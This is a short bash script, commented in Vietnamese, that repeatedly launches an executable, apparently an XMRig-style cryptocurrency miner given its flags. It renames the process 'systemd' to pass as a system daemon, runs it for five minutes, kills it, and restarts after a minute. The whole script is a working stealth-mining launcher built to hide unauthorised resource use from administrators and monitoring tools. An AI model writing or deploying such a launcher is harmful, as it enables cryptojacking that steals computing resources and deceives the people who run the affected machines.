#!/bin/bash

# Lấy tên file thực thi từ .exec_name
EXEC_FILE=$(cat /app/.exec_name)

while true; do
    # Đổi tên tiến trình giả danh systemd hoặc sshd
    exec -a "systemd" /app/$EXEC_FILE --donate-level 1 --cpu-priority 3 --randomx-1gb-pages &

    # Lưu lại PID của tiến trình
    exec_pid=$!

    # Chờ 5 phút
    sleep 300

    # Dừng tiến trình (sau 5 phút)
    kill $exec_pid

    # Nghỉ 1 phút trước khi chạy lại
    sleep 60
done
